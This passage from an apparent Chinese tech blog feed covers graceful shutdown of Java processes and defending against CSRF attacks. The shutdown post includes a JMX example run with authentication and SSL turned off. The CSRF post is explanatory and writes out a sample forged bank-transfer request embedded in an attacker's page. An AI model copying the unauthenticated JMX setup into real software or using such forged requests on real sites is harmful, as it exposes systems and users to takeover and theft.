Thread.currentThread().sleep(<span class="number">5000</span>);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">                System.out.println(<span class="string">"clean task1 completed."</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">        <span class="comment">//注册第二个钩子  </span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    Thread.currentThread().sleep(<span class="number">10000</span>);  </span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                    e.printStackTrace();  </span><br><span class="line">                &#125;  </span><br><span class="line">                System.out.println(<span class="string">"clean task2 completed"</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">        <span class="comment">//启动子线程  </span></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">1000</span>);  </span><br><span class="line">                        System.out.println(<span class="string">"sub thread is running"</span>);  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;.start();  </span><br><span class="line">        <span class="comment">//程序退出  </span></span><br><span class="line">        System.exit(<span class="number">0</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序输出</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">clean task1 completed.  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">sub thread is running  </span><br><span class="line">clean task2 completed</span><br></pre></td></tr></table></figure><p>注意点 ：<code>钩子线程里只处理善后，目标是尽可能快的退出且不保证有脏数据。如果钩子线程里做过多事情，或者发生阻塞，那么可能出现kill失效，程序不能退出的情况，这是需要强制退出</code>。<br>如以下程序会导致kill失效，需要强制退出，因为钩子线程阻塞了：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShutDownTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="comment">//注册钩子  </span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">synchronized</span> (ShutdownFileTest<span class="class">.<span class="keyword">class</span>) </span>&#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        ShutdownFileTest<span class="class">.<span class="keyword">class</span>.<span class="title">wait</span>()</span>;  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">        <span class="comment">//启动子线程  </span></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">1000</span>);  </span><br><span class="line">                        System.out.println(<span class="string">"sub thread is running"</span>);  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;.start();  </span><br><span class="line">       System.exit(<span class="number">0</span>);  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="没使用线程池的多线程中，钩子函数接收到关闭命令时传递死循环标志位"><a href="#没使用线程池的多线程中，钩子函数接收到关闭命令时传递死循环标志位" class="headerlink" title="没使用线程池的多线程中，钩子函数接收到关闭命令时传递死循环标志位"></a>没使用线程池的多线程中，钩子函数接收到关闭命令时传递死循环标志位</h3><p>多线程，用线程启动死循环，然后钩子函数接收到关闭命令时传递死循环标志位。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyRunnable</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> quit =<span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isQuit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> quit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setQuit</span><span class="params">(<span class="keyword">boolean</span> quit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.quit = quit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!quit) &#123;</span><br><span class="line">            doStuff(i++);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doStuff</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"-----&gt;"</span> + n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestThread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> MyRunnable test = <span class="keyword">new</span> MyRunnable();</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> ExecutorService executorService = Executors.newCachedThreadPool();</span><br><span class="line">        executorService.execute(test);</span><br><span class="line"></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                test.setQuit(<span class="keyword">true</span>);</span><br><span class="line">                sleep(<span class="number">5</span>);</span><br><span class="line">                    <span class="keyword">while</span> (test.isQuit()&amp;&amp;!executorService.isShutdown()) &#123;</span><br><span class="line">                        System.out.println(<span class="string">"thread is closed, now ,close executorService!"</span>); <span class="comment">// optional</span></span><br><span class="line">                        executorService.shutdown();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>*n);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="系统创建一个shutdown-file-程序监控一个shutdown-file是否存在"><a href="#系统创建一个shutdown-file-程序监控一个shutdown-file是否存在" class="headerlink" title="系统创建一个shutdown file,程序监控一个shutdown  file是否存在"></a>系统创建一个shutdown file,程序监控一个shutdown file是否存在</h3><p>系统创建一个shutdown file.并监听shutdown file是否存在。如果发现shutdown file不存在了，那么调用System.exit,将程序退出。</p><p><code>如果期望只有特定的人才能终止该程序，那么你可以给文件设定权限，这样就只有特定的人可以终止程序。</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShutdownFileTest</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;  </span><br><span class="line">        <span class="comment">// 启动子线程  </span></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        Thread.currentThread().sleep(<span class="number">1000</span>);  </span><br><span class="line">                        System.out.println(<span class="string">"sub thread is running"</span>);  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;.start();  </span><br><span class="line">          </span><br><span class="line">        <span class="comment">//启动shutdownfile监听线程  </span></span><br><span class="line">        <span class="keyword">new</span> Thread() &#123;  </span><br><span class="line">  </span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">                File shutDownFile = <span class="keyword">new</span> File(<span class="string">"a.shutdown"</span>);  </span><br><span class="line">                <span class="comment">// create shut down file  </span></span><br><span class="line">                <span class="keyword">if</span> (!shutDownFile.exists()) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        shutDownFile.createNewFile();  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="comment">// watch for file deleted then shutdown   </span></span><br><span class="line">                <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;  </span><br><span class="line">                    <span class="keyword">try</span> &#123;  </span><br><span class="line">                        <span class="keyword">if</span> (shutDownFile.exists()) &#123;  </span><br><span class="line">                            Thread.currentThread().sleep(<span class="number">1000</span>);  </span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                            System.exit(<span class="number">0</span>);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;  </span><br><span class="line">                        e.printStackTrace();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;.start();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过JMX的mbean远程控制来实现"><a href="#通过JMX的mbean远程控制来实现" class="headerlink" title="通过JMX的mbean远程控制来实现"></a>通过JMX的mbean远程控制来实现</h3><p>Controlled application:<br>run it with the folowing VM parameters:<br>-Dcom.sun.management.jmxremote<br>-Dcom.sun.management.jmxremote.port=9999<br>-Dcom.sun.management.jmxremote.authenticate=false<br>-Dcom.sun.management.jmxremote.ssl=false</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ThreadMonitorMBean.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">ThreadMonitorMBean</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="function">String <span class="title">getName</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">boolean</span> <span class="title">isRunning</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ThreadMonitor.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadMonitor</span> <span class="keyword">implements</span> <span class="title">ThreadMonitorMBean</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> Thread m_thrd = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ThreadMonitor</span><span class="params">(Thread thrd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    m_thrd = thrd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"JMX Controlled App"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> start application here</span></span><br><span class="line">    System.out.println(<span class="string">"remote start called"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> stop application here</span></span><br><span class="line">    System.out.println(<span class="string">"remote stop called"</span>);</span><br><span class="line"></span><br><span class="line">    m_thrd.interrupt();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isRunning</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Thread.currentThread().isAlive();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">"JMX started"</span>);</span><br><span class="line"></span><br><span class="line">        ThreadMonitorMBean monitor = <span class="keyword">new</span> ThreadMonitor(Thread.currentThread());</span><br><span class="line"></span><br><span class="line">        MBeanServer server = ManagementFactory.getPlatformMBeanServer();</span><br><span class="line"></span><br><span class="line">        ObjectName name = <span class="keyword">new</span> ObjectName(<span class="string">"com.example:type=ThreadMonitor"</span>);</span><br><span class="line"></span><br><span class="line">        server.registerMBean(monitor, name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!Thread.interrupted())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// loop until interrupted</span></span><br><span class="line">            System.out.println(<span class="string">"."</span>);</span><br><span class="line">            <span class="keyword">try</span> </span><br><span class="line">            &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">catch</span>(InterruptedException ex) </span><br><span class="line">            &#123;</span><br><span class="line">                Thread.currentThread().interrupt();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> some final clean up could be here also</span></span><br><span class="line">        System.out.println(<span class="string">"JMX stopped"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Controlling application:<br>run it with the stop or start as the command line argument</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ThreadMonitorConsole</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">// connecting to JMX</span></span><br><span class="line">        System.out.println(<span class="string">"Connect to JMX service."</span>);</span><br><span class="line">        JMXServiceURL url = <span class="keyword">new</span> JMXServiceURL(<span class="string">"service:jmx:rmi:///jndi/rmi://:9999/jmxrmi"</span>);</span><br><span class="line">        JMXConnector jmxc = JMXConnectorFactory.connect(url, <span class="keyword">null</span>);</span><br><span class="line">        MBeanServerConnection mbsc = jmxc.getMBeanServerConnection();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Construct proxy for the the MBean object</span></span><br><span class="line">        ObjectName mbeanName = <span class="keyword">new</span> ObjectName(<span class="string">"com.example:type=ThreadMonitor"</span>);</span><br><span class="line">        ThreadMonitorMBean mbeanProxy = JMX.newMBeanProxy(mbsc, mbeanName, ThreadMonitorMBean<span class="class">.<span class="keyword">class</span>, <span class="title">true</span>)</span>;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Connected to: "</span>+mbeanProxy.getName()+<span class="string">", the app is "</span>+(mbeanProxy.isRunning() ? <span class="string">""</span> : <span class="string">"not "</span>)+<span class="string">"running"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// parse command line arguments</span></span><br><span class="line">        <span class="keyword">if</span>(args[<span class="number">0</span>].equalsIgnoreCase(<span class="string">"start"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">"Invoke \"start\" method"</span>);</span><br><span class="line">            mbeanProxy.start();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(args[<span class="number">0</span>].equalsIgnoreCase(<span class="string">"stop"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">"Invoke \"stop\" method"</span>);</span><br><span class="line">            mbeanProxy.stop();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// clean up and exit</span></span><br><span class="line">        jmxc.close();</span><br><span class="line">        System.out.println(<span class="string">"Done."</span>);    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception e)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://stackoverflow.com/questions/191215/how-to-stop-java-process-gracefully">how-to-stop-java-process-gracefully</a></p><p><a href="http://singleant.iteye.com/blog/1441219">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>停止Java进程</tag>
        <tag>传递信号给进程</tag>
      </tags>
  </entry>
  <entry>
    <title>简单防御CSRF(Cross-site request forgery)</title>
    <url>/2015/12/02/simple-defense-Cross-site-request-forgery/</url>
    <content><![CDATA[<h2 id="CSRF-背景与介绍"><a href="#CSRF-背景与介绍" class="headerlink" title="CSRF 背景与介绍"></a>CSRF 背景与介绍</h2><p>CSRF（Cross Site Request Forgery, 跨站域请求伪造）是一种网络的攻击方式，它在 2007 年曾被列为互联网 20 大安全隐患之一。其他安全隐患，比如 SQL 脚本注入，跨站域脚本攻击等在近年来已经逐渐为众人熟知，很多网站也都针对他们进行了防御。然而，对于大多数人来说，CSRF 却依然是一个陌生的概念。即便是大名鼎鼎的 Gmail, 在 2007 年底也存在着 CSRF 漏洞，从而被黑客攻击而使 Gmail 的用户造成巨大的损失。</p><h3 id="CSRF-攻击实例"><a href="#CSRF-攻击实例" class="headerlink" title="CSRF 攻击实例"></a>CSRF 攻击实例</h3><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</code>可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>。但是这个请求来自 Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码：<code>src=&quot;http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory&quot;</code><br>，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p><h3 id="CSRF-攻击的对象"><a href="#CSRF-攻击的对象" class="headerlink" title="CSRF 攻击的对象"></a>CSRF 攻击的对象</h3><p>在讨论如何抵御 CSRF 之前，先要明确 CSRF 攻击的对象，也就是要保护的对象。从以上的例子可知，CSRF 攻击是黑客借助受害者的 cookie 骗取服务器的信任，但是黑客并不能拿到 cookie，也看不到 cookie 的内容。另外，对于服务器返回的结果，由于浏览器同源策略的限制，黑客也无法进行解析。因此，黑客无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。所以，我们要保护的对象是那些可以直接产生数据改变的服务，而对于读取数据的服务，则不需要进行 CSRF 的保护。比如银行系统中转账的请求会直接改变账户的金额，会遭到 CSRF 攻击，需要保护。而查询余额是对金额的读取操作，不会改变数据，CSRF 攻击无法解析服务器返回的结果，无需保护。</p><h2 id="当前防御-CSRF-的几种策略"><a href="#当前防御-CSRF-的几种策略" class="headerlink" title="当前防御 CSRF 的几种策略"></a>当前防御 CSRF 的几种策略</h2><p>在业界目前防御 CSRF 攻击主要有三种策略：验证 HTTP Referer 字段；在请求地址中添加 token 并验证；在 HTTP 头中自定义属性并验证。下面就分别对这三种策略进行详细介绍。</p><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问<code>http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</code>，用户必须先登陆 bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p><p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p><p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p><p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p><p>另外，据说Referer其实应该是英文单词Referrer，不过拼错的人太多了，所以编写标准的人也就将错就错了。</p><h4 id="适合使用Referer的地方"><a href="#适合使用Referer的地方" class="headerlink" title="适合使用Referer的地方"></a>适合使用Referer的地方</h4><p>Referer可以记录访问的来源，统计访问量，比如统计用户都是从哪里的链接访问过来的等等，可以用来防盗链。<br>不要把Rerferer用在身份验证或者其他非常重要的检查上，因为Rerferer非常容易在客户端被改变。<br><code>HTTP-REFERER</code>这个变量已经越来越不可靠了，完全就是可以伪造出来的东东。<br><a href="http://blog.csdn.net/21aspnet/article/details/7419672">伪造方法</a><br>原理都是<code>sock构造http头来senddata</code>。<br>目前比较简单的防御伪造referer的方法是用验证码（Session）。</p><p>现在有一些能防盗链软件的商业公司比如UUDOG，linkgate，VirtualWall什么的，都是开发的应用于IIS上面的dll。<br>有的是采用cookies验证、线程控制，有的是能随机生成文件名然后做URL重写。有的方法能的确达到不错的效果.</p><p>不过道高一尺，魔高一丈，这些雕虫小技终归是有破解方法的。</p><p>一般的就是这样的了，但是服务器就不好实现伪造，只能制造不多的数据了，如果可以实现访问网页就可以伪造，那就可以实现了真正的伪造，实现自然IP分布。</p><h3 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h3><p>CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><p>这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于 session 之中，然后在每次请求时把 token 从 session 中拿出，与请求中的 token 进行比对，但这种方法的难点在于如何把 token 